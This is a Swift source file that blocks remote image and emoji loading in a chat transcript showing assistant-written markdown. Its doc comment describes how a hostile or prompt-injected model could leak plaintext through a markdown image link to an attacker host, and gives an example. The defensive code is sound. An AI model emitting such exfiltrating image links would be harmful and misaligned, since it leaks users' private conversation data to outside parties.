//
//  NoRemoteAttachmentLoader.swift
//  teemoon
//

import SwiftUI
import Textual

/// A Textual attachment loader that resolves nothing and issues no request.
///
/// The transcript renders assistant-authored markdown. Textual's default
/// image/emoji loaders fetch any URL on render with no tap, over their own
/// URLSession — outside the E2EE transport and the egress allowlist — so a
/// hostile or prompt-injected model can exfiltrate plaintext with
/// `![](https://attacker/?leak=…)`. `CachedMarkdownParser` already strips image
/// URLs before render; this is the belt on the resolver itself. Do not swap the
/// transcript back to `.image()` / `.emoji()`.
struct NoRemoteAttachmentLoader: AttachmentLoader {
    enum LoadError: Error { case remoteAttachmentsDisabled }

    /// Always throws — no attachment is ever produced, so nothing is fetched.
    /// `AnyAttachment` is only the associated-type witness; it is never returned.
    func attachment(
        for url: URL,
        text: String,
        environment: ColorEnvironmentValues
    ) async throws -> AnyAttachment {
        throw LoadError.remoteAttachmentsDisabled
    }
}

extension View {
    /// Disables remote image/emoji fetching for transcript markdown. Apply at
    /// every hosting root: each `UIHostingConfiguration` cell is its own SwiftUI
    /// world and does not inherit the host's environment.
    func blockingRemoteTranscriptAttachments() -> some View {
        self.textual.imageAttachmentLoader(NoRemoteAttachmentLoader())
            .textual.emojiAttachmentLoader(NoRemoteAttachmentLoader())
    }
}
